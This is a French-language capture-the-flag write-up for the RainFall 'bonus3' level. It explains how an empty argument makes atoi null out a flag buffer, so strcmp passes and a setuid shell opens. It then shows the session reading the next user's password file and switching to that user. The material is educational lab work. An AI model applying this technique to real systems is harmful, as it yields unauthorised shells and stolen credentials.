# Level Bonus3

Pour ce niveau apres le desassemblage et l'ecriture du code en `C`

On peut voir clairement que la ligne qui nous permet d'executer un shell est la condition ci dessous:

```c
if (!strcmp(flag_buffer, argv[1]))
	execl("/bin/sh", "sh", NULL);
```

Cela implique que nous devrions connaitre le flag a l’avance afin de valider la condition ce qui n’est evidemment pas possible. Nous allons donc contourner cette verification d’une autre maniere

La vulnerabilite repose sur les deux lignes suivantes:
```c
int	buffer_delim = atoi(argv[1]);
flag_buffer[buffer_delim] = '\0';
```
La fonction `atoi` retourne `0` lorsque son argument n’est pas une valeur numerique valide. Ainsi, si nous passons une chaine vide (`""`) en argument, `atoi` retournera `0`, ce qui aura pour effet d’ecrire un caractere nul (`\0`) a l’`index 0` de `flag_buffer`

Dans ce cas `flag_buffer` devient une chaine vide. Etant donne que `argv[1]` est egalement une chaine vide, l’appel a `strcmp` comparera deux chaines vides, ce qui validera la condition et entrainera l’execution d’un `shell`

```bash
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
********************************************
$ su end
Password: 
end@RainFall:~$ cat end 
Congratulations graduate!
end@RainFall:~$ 
```